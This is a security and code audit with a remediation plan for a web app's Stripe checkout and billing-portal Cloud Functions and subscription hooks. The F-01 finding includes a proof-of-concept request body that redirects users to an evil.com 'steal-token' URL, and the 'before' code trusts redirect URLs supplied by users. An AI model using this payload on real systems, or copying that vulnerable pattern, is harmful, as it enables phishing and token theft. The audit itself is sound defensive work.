# Phase 2 — Audit & Remediation Plan

> **Status: Historical plan, superseded by `docs/launch/LAUNCH-CHECKLIST.md`.**

> **Audit date**: 28 March 2026  
> **Scope**: All Phase 2 deliverables — Cloud Functions (`createCheckoutSession`, `stripeWebhook`,
> `createBillingPortalSession`, `stripeWebhookHandlers`, `subscriptionWriter`, `webhookIdempotency`,
> `stripeClient`), frontend subscription feature (`subscriptionStore`, `subscriptionService`,
> `useCheckout`, `useBillingPortal`, `useFeatureGate`, `PricingCard`, `UpgradePrompt`,
> `AccountSection` subscription block), wiring in `authService` + `App.tsx`.

---

## Finding Index

| # | Severity | Category | Title |
|---|----------|----------|-------|
| F-01 | 🔴 Critical | Security | Open redirect — `successUrl`/`cancelUrl` in checkout |
| F-02 | 🔴 Critical | Business Logic | `isActive` not factored into feature gating |
| F-03 | 🟠 High | Security | `returnUrl` open redirect in billing portal |
| F-04 | 🟠 High | Security | Missing `recordThreatEvent` calls in `createBillingPortalSession` |
| F-05 | 🟠 High | Testing | Zero Cloud Function unit tests for all 7 Phase 2 server files |
| F-06 | 🟡 Medium | Testing | `useCheckout` and `useBillingPortal` have no tests |
| F-07 | 🟡 Medium | Testing | `useSubscriptionStore` missing from Zustand selector structural test |
| F-08 | 🟡 Medium | Styling | `UpgradePrompt` uses Tailwind spacing class — zeroed by global reset |
| F-09 | 🟡 Medium | Wiring | Duplicate `loadSubscription` Firestore read on every sign-in |
| F-10 | 🟢 Low | Dead Code | `PricingCard.tsx` is never imported — orphaned component |
| F-11 | 🟢 Low | Dead Code | Dead ternary in `PricingCard` — both branches identical |
| F-12 | 🟢 Low | Safety | `checkoutUrl` null not guarded before `window.location.href` |

---

## Detailed Findings

### F-01 🔴 CRITICAL — Open Redirect: `successUrl`/`cancelUrl` in checkout
**File**: `functions/src/createCheckoutSession.ts`  
**Lines**: `~133–153`

```typescript
// ❌ Attacker POC: POST /createCheckoutSession
// Body: { "priceId": "price_pro_monthly_inr", "successUrl": "https://evil.com/steal-token?token={{FB_TOKEN}}" }
const session = await stripe.checkout.sessions.create({
  success_url: body.successUrl ?? DEFAULT_SUCCESS_URL,   // ← user-controlled!
  cancel_url:  body.cancelUrl  ?? DEFAULT_CANCEL_URL,    // ← user-controlled!
  ...
});
```

An authenticated user (or a user phished into clicking a crafted link) can make an authenticated POST to `createCheckoutSession` with arbitrary redirect URLs. After successful checkout, the victim is sent to the attacker's domain — ideal phishing staging point where the attacker intercepts a token or fakes a "login again" page.

**Even though the current `useCheckout.ts` client never sends these fields**, the server must never trust them. Stripe does validate that these are valid HTTP(S) URLs but does not verify they belong to your domain.

**Fix**: Validate that URLs are on the allowlist (`actionstation.in` and localhost dev).

---

### F-02 🔴 CRITICAL — `isActive` not checked in feature gating
**Files**: `src/features/subscription/types/subscription.ts`, `src/features/subscription/hooks/useFeatureGate.ts`

When a subscription payment fails, the webhook fires `invoice.payment_failed` and `stripeWebhookHandlers.ts` writes `{ tier: 'pro', isActive: false }` to Firestore. This is correct server-side behaviour (preserving the tier for graceful dunning).

However, `hasFeatureAccess()` ignores `isActive`, and `useFeatureGate` only reads `tier`:

```typescript
// ❌ src/features/subscription/types/subscription.ts
export function hasFeatureAccess(tier: SubscriptionTier, feature: GatedFeature): boolean {
    const requiredTier = FEATURE_TIER_MAP[feature];
    return TIER_RANK[tier] >= TIER_RANK[requiredTier];  // isActive never checked!
}

// useFeatureGate.ts
const tier = useSubscriptionStore((s) => s.tier);
// isActive is in the store but never read here
const hasAccess = useMemo(() => hasFeatureAccess(tier, feature), [tier, feature]);
```

**Result**: A user with a failed payment retains all Pro features indefinitely (as long as the client-side cache is not cleared). The `isActive: false` field is only cosmetically surfaced in `AccountSection` status badge.

**Also affects**: `offlineQueueStore.ts` and `useDocumentAgent.ts` which call `useSubscriptionStore.getState().hasAccess(feature)` — these go through the same broken `hasAccess` action in the store.

**Fix**: `hasFeatureAccess` must accept `isActive` as a second argument and return `false` when `isActive === false`, regardless of tier.

---

### F-03 🟠 HIGH — Open Redirect: `returnUrl` in billing portal
**File**: `functions/src/createBillingPortalSession.ts`  
**Lines**: `~119–130`

```typescript
// ❌ Same pattern as F-01
const returnUrl = (req.body as { returnUrl?: string }).returnUrl ?? DEFAULT_RETURN_URL;
const session = await stripe.billingPortal.sessions.create({
    customer: customerId,
    return_url: returnUrl,  // ← user-controlled with no allowlist
});
```

The current client (`useBillingPortal.ts`) sends an empty body and never includes `returnUrl`, so production exploitability is low. But the attack surface exists if the function is ever called directly.

**Fix**: Same URL allowlist as F-01, or simply remove the `returnUrl` parameter and always use `DEFAULT_RETURN_URL`.

---

### F-04 🟠 HIGH — Missing `recordThreatEvent` in `createBillingPortalSession`
**File**: `functions/src/createBillingPortalSession.ts`

Compared to the established pattern in `createCheckoutSession` and `geminiProxy`, the billing portal function is missing threat counter calls on 3 of 4 exit points:

| Layer | `createCheckoutSession` | `createBillingPortalSession` |
|-------|------------------------|------------------------------|
| Bot detection | `recordThreatEvent('bot_spike')` ✓ | `recordThreatEvent('bot_spike')` ✓ |
| IP rate limit | `recordThreatEvent('429_spike')` ✓ | ❌ missing |
| Auth failure | `recordThreatEvent('auth_failure_spike')` ✓ | ❌ missing |
| User rate limit | `recordThreatEvent('429_spike')` ✓ | ❌ missing |

CLAUDE.md: *"Threat counters on every 4xx/5xx — call `recordThreatEvent()` for `429_spike`, `500_spike`, `auth_failure_spike`, `bot_spike`"*

---

### F-05 🟠 HIGH — Zero Cloud Function tests for all 7 Phase 2 server files
**Missing test files** (Plan D9: ~300 lines):

| File | Tests Exist? | Min Coverage Target |
|------|:---:|---|
| `createCheckoutSession.ts` | ❌ | 85% (service) |
| `stripeWebhook.ts` | ❌ | 85% |
| `createBillingPortalSession.ts` | ❌ | 85% |
| `stripeWebhookHandlers.ts` | ❌ | 85% |
| `subscriptionWriter.ts` | ❌ | 100% (util) |
| `webhookIdempotency.ts` | ❌ | 100% (util) |
| `stripeClient.ts` | ❌ | 85% |

The structural tests (`stripeKeyIsolation`, `webhookSignatureVerification`) pass, but there is zero behavioral test coverage for the money-critical paths: signature verification, idempotency dedup logic, each webhook event handler, the checkout session creation error paths, and the billing portal customer-lookup branch.

---

### F-06 🟡 MEDIUM — `useCheckout` and `useBillingPortal` have no tests
**Missing**: `hooks/__tests__/useCheckout.test.ts`, `hooks/__tests__/useBillingPortal.test.ts`

These hooks handle the actual payment redirect flow and billing portal entry. CLAUDE.md requires ≥80% coverage for hooks. Only `useFeatureGate` has tests.

---

### F-07 🟡 MEDIUM — `useSubscriptionStore` missing from Zustand selector structural test
**File**: `src/__tests__/zustandSelectorPatterns.ts`

`useSubscriptionStore` is used in `AccountSection`, `useFeatureGate`, `useDocumentAgent`, `offlineQueueStore` but is **absent** from both `BARE_DESTRUCTURING_PATTERNS` and `ACTION_SELECTOR_PATTERNS`. This means a future developer could write:

```typescript
// ❌ This would NOT be caught by the structural test today
const { tier, hasAccess } = useSubscriptionStore();
```

...and the CI build would still pass. The store must be added to both pattern lists and to the ALLOWLIST.

---

### F-08 🟡 MEDIUM — `UpgradePrompt` Tailwind spacing class zeroed by global reset
**File**: `src/shared/components/UpgradePrompt.tsx`  
**Line**: 17

```tsx
// ❌ p-[var(--space-xl)] is a Tailwind utility → lives in @layer utilities
// The bare * { padding: 0 } in global.css (outside any layer) wins the cascade
<div className="... p-[var(--space-xl)] ...">
```

The CLAUDE.md golden rule: *"the global CSS reset zeros all Tailwind spacing utilities… use `style` props for all `margin`, `padding`, and `gap` values"*.

The modal has **zero padding** — all content is flush to the border. This appears correct in dev (Tailwind JIT may inline the variable) but is unreliable across browsers/build modes.

**Fix**: Move `p-[var(--space-xl)]` to `style={{ padding: 'var(--space-xl)' }}`.

---

### F-09 🟡 MEDIUM — Duplicate `loadSubscription` Firestore read on every sign-in
**Files**: `src/features/auth/services/authService.ts` (line ~100), `src/App.tsx` (lines ~64–69)

```typescript
// authService.ts — subscribeToAuthState():
void useSubscriptionStore.getState().loadSubscription(user.id);  // fires on auth change

// App.tsx — AuthenticatedApp useEffect:
useEffect(() => {
    if (userId) {
        void useSubscriptionStore.getState().loadSubscription(userId);  // fires again!
    }
}, [userId]);
```

On every sign-in, `subscribeToAuthState` fires → sets `user` in `authStore` → `userId` in `App.tsx` changes → `useEffect` fires → **second `loadSubscription` call, second Firestore read**. The `loadSubscription` calls `clearCache()` before every fetch so the second call always hits Firestore (no cache hit).

The `useEffect` in `App.tsx` was added for the initial session-restore case (page refresh), but `subscribeToAuthState` already handles that path too — `onAuthStateChanged` fires on page load when Firebase restores the session.

**Fix**: Remove the `loadSubscription` call from `App.tsx`'s `useEffect`. The `authService` subscription already covers both initial load and subsequent sign-ins.

---

### F-10 🟢 LOW — `PricingCard.tsx` is orphaned (never rendered)
**File**: `src/features/subscription/components/PricingCard.tsx`

`grep` returns zero import sites. The component exists but no page, modal, or route renders it. Plan deliverable D10 created the component but the anticipated `PricingPage` or upgrade flow doesn't exist yet.

**Action**: Either wire it into a `PricingPage` (Phase 3 scope) or add a `FIXME` comment marking it as pending. Do not delete — it will be needed once the upgrade flow is built.

---

### F-11 🟢 LOW — Dead ternary in `PricingCard`
**File**: `src/features/subscription/components/PricingCard.tsx`  
**Line**: `~55`

```tsx
// ❌ Both branches are identical — the ternary has no effect
{plan.interval === 'month' ? s.proFeatures : s.proFeatures}
```

The annual plan should likely show savings text (e.g. `s.proFeaturesAnnual`). Fix when wiring `PricingCard` into the UI (F-10 task).

---

### F-12 🟢 LOW — `checkoutUrl` null not guarded
**File**: `functions/src/createCheckoutSession.ts`

```typescript
// Stripe types session.url as string | null
res.status(200).json({ checkoutUrl: session.url });
// Client does: window.location.href = checkoutUrl  → navigates to "null" if null
```

For Stripe Hosted Checkout (`mode: 'subscription'`), `session.url` is never null. But a defensive null check and 500 response is safer than silently redirecting to `"null"`.

---

## Phase-wise Remediation Plan

Severity order: Critical → High → Medium (security-first) → Low (polish/debt).

---

### Phase A — Critical Fixes (Do First, Unblock Production)

> **Goal**: Eliminate the two exploitable bugs before any production traffic.
> **Estimate**: ~2 hours

#### A-1: Fix open redirect in `createCheckoutSession` (F-01)

**File**: `functions/src/createCheckoutSession.ts`

Remove `successUrl`/`cancelUrl` from the user-controlled surface entirely. The client never sends them; always use the server-side defaults. Remove the fallback from the request body.

```typescript
// ❌ Before
session = await stripe.checkout.sessions.create({
    success_url: body.successUrl ?? DEFAULT_SUCCESS_URL,
    cancel_url:  body.cancelUrl  ?? DEFAULT_CANCEL_URL,
    ...
});

// ✅ After — remove from CheckoutRequestBody interface too
session = await stripe.checkout.sessions.create({
    success_url: DEFAULT_SUCCESS_URL,
    cancel_url:  DEFAULT_CANCEL_URL,
    ...
});
```

Also remove `successUrl` and `cancelUrl` from the `CheckoutRequestBody` interface.

#### A-2: Fix `isActive` not gating features (F-02)

**Files**: `src/features/subscription/types/subscription.ts`, `src/features/subscription/hooks/useFeatureGate.ts`

**Step 1** — Add `isActive` parameter to `hasFeatureAccess`:

```typescript
// ✅ After
export function hasFeatureAccess(
    tier: SubscriptionTier,
    feature: GatedFeature,
    isActive = true,
): boolean {
    if (!isActive) return false;
    const requiredTier = FEATURE_TIER_MAP[feature];
    return TIER_RANK[tier] >= TIER_RANK[requiredTier];
}
```

**Step 2** — Update `useFeatureGate` to pass `isActive`:

```typescript
const tier = useSubscriptionStore((s) => s.tier);
const isActive = useSubscriptionStore((s) => s.isActive);
const isLoading = useSubscriptionStore((s) => s.isLoading);
const hasAccess = useMemo(
    () => hasFeatureAccess(tier, feature, isActive),
    [tier, isActive, feature],
);
```

**Step 3** — Update `subscriptionStore.hasAccess` action (used by `offlineQueueStore` and `useDocumentAgent`):

```typescript
hasAccess: (feature: GatedFeature) => {
    const { tier, isActive } = get();
    return hasFeatureAccess(tier, feature, isActive);
},
```

**Step 4** — Update all tests for `hasFeatureAccess` to include the `isActive` parameter.

---

### Phase B — High Priority (Complete Within Same Sprint)

> **Goal**: Close security gaps and establish test coverage baseline.
> **Estimate**: ~4–6 hours

#### B-1: Fix open redirect in `createBillingPortalSession` (F-03)

**File**: `functions/src/createBillingPortalSession.ts`

Remove `returnUrl` from user-controlled surface — always use `DEFAULT_RETURN_URL`:

```typescript
// ❌ Before
const returnUrl = (req.body as { returnUrl?: string }).returnUrl ?? DEFAULT_RETURN_URL;

// ✅ After
const returnUrl = DEFAULT_RETURN_URL;
```

#### B-2: Add missing `recordThreatEvent` calls in billing portal (F-04)

**File**: `functions/src/createBillingPortalSession.ts`

Add the three missing calls to match the pattern used in `createCheckoutSession`:

```typescript
// IP rate limit block
recordThreatEvent('429_spike', { ip, endpoint: 'createBillingPortalSession' });

// Auth failure
recordThreatEvent('auth_failure_spike', { ip, endpoint: 'createBillingPortalSession' });

// User rate limit
recordThreatEvent('429_spike', { uid, endpoint: 'createBillingPortalSession' });
```

#### B-3: Write Cloud Function unit tests (F-05)

Create the following test files. Priority order:

| Priority | File | Key scenarios to cover |
|----------|------|----------------------|
| 1 | `functions/src/__tests__/stripeWebhook.test.ts` | Missing signature header → 400; Invalid sig → 400; Already processed → 200 with "already processed"; Handler throws → 500; Success → 200 |
| 2 | `functions/src/utils/__tests__/webhookIdempotency.test.ts` | `checkIdempotency` returns false for new events; true for seen; `recordEvent` writes correct doc |
| 3 | `functions/src/utils/__tests__/stripeWebhookHandlers.test.ts` | Each of 5 handlers: happy path + missing userId throws |
| 4 | `functions/src/utils/__tests__/subscriptionWriter.test.ts` | `writeSubscription` calls `set(merge:true)`; `downgradeToFree` writes correct tier |
| 5 | `functions/src/__tests__/createCheckoutSession.test.ts` | Invalid priceId → 400; Valid → 200 with checkoutUrl; Stripe error → 500 |
| 6 | `functions/src/__tests__/createBillingPortalSession.test.ts` | Missing customerId → 404; Valid → 200 with portalUrl |
| 7 | `functions/src/utils/__tests__/stripeClient.test.ts` | Returns same instance on second call; `resetStripeClient` returns new instance |

#### B-4: Write `useCheckout` and `useBillingPortal` tests (F-06)

**Files**: `src/features/subscription/hooks/__tests__/useCheckout.test.ts`, `useBillingPortal.test.ts`

Key scenarios:
- `useCheckout`: No auth → does not call fetch; Valid priceId → calls correct endpoint with Bearer token; HTTP error → sets error string; Redirect on success
- `useBillingPortal`: No auth → does not call fetch; Success → navigates to portalUrl; Error response → sets error

---

### Phase C — Medium Priority (Complete Before Next Phase)

> **Goal**: Close structural test gaps, fix styling regression, remove redundant cost.
> **Estimate**: ~2–3 hours

#### C-1: Add `useSubscriptionStore` to Zustand selector structural test (F-07)

**File**: `src/__tests__/zustandSelectorPatterns.ts`

**Step 1** — Add to `BARE_DESTRUCTURING_PATTERNS`:
```typescript
{ name: 'Destructuring from useSubscriptionStore()', 
  pattern: /const\s*\{[^}]+\}\s*=\s*useSubscriptionStore\(\)/ },
```

**Step 2** — Add to `ACTION_SELECTOR_PATTERNS` regex alternation (already covers `load\w+`, `reset\w+`, `hasAccess` via existing patterns but ensure `useSubscriptionStore` name is included in the store union).

**Step 3** — Add `subscriptionStore` to `ALLOWLIST`:
```typescript
'features/subscription/stores/subscriptionStore.ts',
```

**Step 4** — Update the test title `it('returns errors for all 8 vars…')` → 9 vars if any new env var is also added.

#### C-2: Fix `UpgradePrompt` Tailwind padding (F-08)

**File**: `src/shared/components/UpgradePrompt.tsx`

```tsx
// ❌ Before
<div className="fixed inset-0 ... p-[var(--space-xl)] ...">

// ✅ After — remove p-[var(--space-xl)] from className, add to style prop
<div
    className="fixed inset-0 flex items-center justify-center bg-[hsla(0,0%,0%,0.4)] z-[var(--z-modal)]"
    role="dialog"
    aria-modal="true"
>
    <div
        className="bg-[var(--color-surface-elevated)] border border-[var(--color-border)] rounded-[var(--radius-xl)] max-w-[400px] w-[90%] shadow-[var(--shadow-xl)] text-center"
        style={{ padding: 'var(--space-xl)' }}
    >
```

#### C-3: Remove duplicate `loadSubscription` in `App.tsx` (F-09)

**File**: `src/App.tsx`

Remove the `loadSubscription` call from the `useEffect` — `authService.subscribeToAuthState` already handles it on every auth state change (initial page-load session restore + subsequent sign-ins):

```typescript
// ✅ After — remove loadSubscription, keep loadPinnedIds
useEffect(() => {
    if (userId) {
        void usePinnedWorkspaceStore.getState().loadPinnedIds();
        // loadSubscription is called by subscribeToAuthState — no duplicate needed
    }
}, [userId]);
```

---

### Phase D — Low Priority (Polish / Tech Debt, Next Sprint)

> **Goal**: Clean up orphaned code and minor safety gaps.
> **Estimate**: ~1 hour

#### D-1: Add `checkoutUrl` null guard (F-12)

**File**: `functions/src/createCheckoutSession.ts`

```typescript
// ✅ After
if (!session.url) {
    logSecurityEvent({
        type: SecurityEventType.WEBHOOK_PROCESSING_ERROR,
        uid,
        endpoint: 'createCheckoutSession',
        message: 'Stripe returned null session.url',
        metadata: { priceId },
    });
    res.status(500).json({ error: errorMessages.checkoutFailed });
    return;
}
res.status(200).json({ checkoutUrl: session.url });
```

#### D-2: Mark `PricingCard` as pending wiring (F-10)

**File**: `src/features/subscription/components/PricingCard.tsx`

Add a comment at the top of the file:
```typescript
/**
 * PricingCard — displays a single pricing plan (Free or Pro)
 * TODO(Phase 3): Wire into PricingPage / upgrade modal.
 * Not yet rendered anywhere — do not delete.
 */
```

#### D-3: Fix dead ternary in `PricingCard` (F-11)

Add distinct strings for annual plan description or remove the ternary:
```typescript
// ✅ After (when wiring in Phase 3)
{plan.interval === 'month' ? s.proFeatures : s.proFeaturesAnnual}
```
Add `proFeaturesAnnual` to `subscriptionStrings.ts`.

---

## Execution Order Summary

```
Phase A  (now)    Critical bugs — do before any production traffic
  A-1  Remove user-controlled successUrl/cancelUrl from checkout
  A-2  Gate features on isActive, not just tier

Phase B  (same sprint)  High — security completeness + test baseline
  B-1  Remove user-controlled returnUrl from billing portal
  B-2  Add 3 missing recordThreatEvent calls in billing portal
  B-3  Write all 7 Cloud Function unit test files (D9)
  B-4  Write useCheckout + useBillingPortal tests

Phase C  (before Phase 3 starts)  Medium — structural + styling
  C-1  Add useSubscriptionStore to Zustand selector structural test
  C-2  Fix UpgradePrompt padding (style prop, not Tailwind class)
  C-3  Remove duplicate loadSubscription in App.tsx

Phase D  (next sprint)  Low — polish + debt
  D-1  Add null guard for checkoutUrl
  D-2  Mark PricingCard as pending wiring
  D-3  Fix dead ternary in PricingCard
```

---

## Files Touched Per Phase

### Phase A
- `functions/src/createCheckoutSession.ts`
- `src/features/subscription/types/subscription.ts`
- `src/features/subscription/hooks/useFeatureGate.ts`
- `src/features/subscription/stores/subscriptionStore.ts`
- `src/features/subscription/stores/__tests__/subscriptionStore.test.ts`
- `src/features/subscription/hooks/__tests__/useFeatureGate.test.ts`

### Phase B
- `functions/src/createBillingPortalSession.ts`
- `functions/src/__tests__/stripeWebhook.test.ts` (new)
- `functions/src/__tests__/createCheckoutSession.test.ts` (new)
- `functions/src/__tests__/createBillingPortalSession.test.ts` (new)
- `functions/src/utils/__tests__/webhookIdempotency.test.ts` (new)
- `functions/src/utils/__tests__/stripeWebhookHandlers.test.ts` (new)
- `functions/src/utils/__tests__/subscriptionWriter.test.ts` (new)
- `functions/src/utils/__tests__/stripeClient.test.ts` (new)
- `src/features/subscription/hooks/__tests__/useCheckout.test.ts` (new)
- `src/features/subscription/hooks/__tests__/useBillingPortal.test.ts` (new)

### Phase C
- `src/__tests__/zustandSelectorPatterns.ts`
- `src/shared/components/UpgradePrompt.tsx`
- `src/App.tsx`

### Phase D
- `functions/src/createCheckoutSession.ts`
- `src/features/subscription/components/PricingCard.tsx`
- `src/features/subscription/strings/subscriptionStrings.ts`
